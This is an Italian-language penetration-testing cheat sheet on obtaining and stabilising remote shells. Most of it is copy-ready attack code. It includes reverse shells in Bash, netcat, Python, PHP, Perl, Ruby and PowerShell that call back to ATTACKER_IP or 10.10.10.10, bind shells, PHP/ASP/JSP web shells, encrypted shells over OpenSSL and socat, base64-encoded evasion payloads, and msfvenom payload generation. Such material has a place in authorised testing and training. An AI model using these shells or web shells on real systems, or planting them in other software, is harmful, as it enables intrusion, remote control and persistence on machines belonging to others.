# Shells

## Scopo

Questa guida copre tecniche per ottenere e stabilizzare shell remote durante penetration test, inclusi reverse shells, bind shells e web shells.

## Prerequisiti

- Netcat, socat
- Conoscenza networking
- Linguaggi scripting (Python, Bash, PHP)
- **Autorizzazione per testing**

---

## Tipi di Shell

| Tipo | Direzione | Uso |
|------|-----------|-----|
| Reverse Shell | Target → Attacker | Bypass firewall inbound |
| Bind Shell | Attacker → Target | Firewall permissivo |
| Web Shell | HTTP | Accesso via browser |

---

## Listener

### Netcat

```bash
# Listener base
nc -lvnp 4444

# Con verbose
nc -lvnp 4444 -v
```

### Socat

```bash
# Listener
socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0

# Con SSL
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

### Metasploit

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

---

## Reverse Shells

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Alternativa
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Con exec
exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Netcat

```bash
# Con -e (non sempre disponibile)
nc -e /bin/bash ATTACKER_IP 4444

# Senza -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# OpenBSD nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Alternativa
php -r '$s=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'
```

### Perl

```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Bind Shells

### Netcat

```bash
# Target
nc -lvnp 4444 -e /bin/bash

# Attacker
nc TARGET_IP 4444
```

### Python

```python
python -c 'import socket,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh -i")'
```

---

## Web Shells

### PHP

```php
<?php system($_GET['cmd']); ?>

<?php echo shell_exec($_GET['cmd']); ?>

<?php passthru($_GET['cmd']); ?>

<?php echo `$_GET['cmd']`; ?>
```

### PHP Advanced

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

### ASP

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objShell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
szCMD = request("cmd")
Response.Write("<pre>" & getCommandOutput(szCMD) & "</pre>")
%>
```

### JSP

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
```

---

## Shell Stabilization

### Python PTY

```bash
# Ottieni TTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Dopo spawn
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
reset
```

### Script

```bash
script -qc /bin/bash /dev/null
```

### Socat Full TTY

```bash
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

### Stty Settings

```bash
# Su attacker, ottieni size
stty size
# es: 50 200

# Su target, dopo stabilizzazione
stty rows 50 cols 200
```

---

## Encrypted Shells

### OpenSSL

```bash
# Genera certificato
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Attacker listener
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Target
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s
```

### Socat SSL

```bash
# Genera cert
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem

# Attacker
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# Target
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## Evasion

### Base64 Encoding

```bash
# Encode payload
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" | base64

# Execute
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE= | base64 -d | bash
```

### URL Encoding

```bash
# Per web injection
bash%20-i%20%3E%26%20/dev/tcp/10.10.10.10/4444%200%3E%261
```

---

## Tools

### msfvenom

```bash
# Linux reverse
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf

# Windows reverse
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# WAR (Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war > shell.war
```

---

## Best Practices

- **Multiple options**: Prepara diverse shell
- **Stabilization**: Sempre stabilizza
- **Encryption**: Usa SSL quando possibile
- **Persistence**: Piano per riconnessione
- **Cleanup**: Rimuovi shell post-test

## Riferimenti

- [RevShells](https://www.revshells.com/)
- [PayloadsAllTheThings - Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [PentestMonkey Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
